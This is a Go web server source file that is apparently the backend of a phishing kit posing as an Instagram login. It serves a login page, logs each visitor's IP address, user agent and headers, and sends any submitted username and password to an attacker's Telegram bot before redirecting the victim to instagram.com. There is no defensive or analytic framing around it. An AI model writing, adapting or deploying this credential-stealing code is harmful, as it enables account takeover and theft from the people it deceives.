package main

import (
    "fmt"
    "net/http"
    "time"
    "github.com/gin-gonic/gin"
    "github.com/gin-contrib/limit"
    "config"
)

type UserDataHandler struct {
    router *gin.Engine
}

func NewUserDataHandler() *UserDataHandler {
    handler := &UserDataHandler{
        router: gin.Default(),
    }
    handler.router.Static("/static", "./static")
    handler.router.LoadHTMLGlob("template/*")
    handler.router.GET("/", handler.Index)
    handler.router.POST("/login", handler.GetData)
    return handler
}

func (h *UserDataHandler) SendData(username, password string) {
    data := fmt.Sprintf(`
    🎉 The user has entered the information
    \n💌 USER NAME: %s
    \n❗ PASSWORD: %s
    \n🕛 Time: %s
    \n⚜ Coded By: @zelroth
    `, username, password, time.Now().Format("15:04:05"))
    
    http.Get(fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", config.BOT_TOKEN, config.ADMIN, data))
}

func (h *UserDataHandler) SendIP(c *gin.Context) {
    data := fmt.Sprintf(`
    New Target Added 💘
    \n⭕ IP: %s
    \n🎃 User-Agent: %s
    \n🔱 Headers:\n %s
    \n🕛 Date: %s
    \n⚜ Coded By: @zelroth
    `, c.ClientIP(), c.Request.UserAgent(), c.Request.Header, time.Now().Format("15:04:05"))
    
    http.Get(fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", config.BOT_TOKEN, config.ADMIN, data))
}

func (h *UserDataHandler) Index(c *gin.Context) {
    h.SendIP(c)
    c.HTML(http.StatusOK, "login.html", nil)
}

func (h *UserDataHandler) GetData(c *gin.Context) {
    username := c.PostForm("username")
    password := c.PostForm("password")
    h.SendData(username, password)
    c.Redirect(http.StatusFound, "https://instagram.com")
}

func main() {
    handler := NewUserDataHandler()
    handler.router.Use(limit.New(3, time.Minute))
    handler.router.Run("0.0.0.0:8022")
}

